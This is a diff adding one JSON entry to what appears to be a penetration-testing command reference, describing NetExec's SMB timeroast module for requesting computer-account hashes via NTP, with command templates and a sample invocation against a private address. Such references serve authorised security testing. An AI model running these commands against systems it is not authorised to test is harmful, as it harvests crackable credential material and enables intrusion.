@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-timeroast",
+  "name": "NetExec SMB Timeroast",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M timeroast",
+  "description": "Exploit NTP to request hashes for computer accounts without a password (Timeroasting)",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "timeroast",
+    "ntp",
+    "computer-account",
+    "hash"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M timeroast"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M timeroast"
+  ]
+}
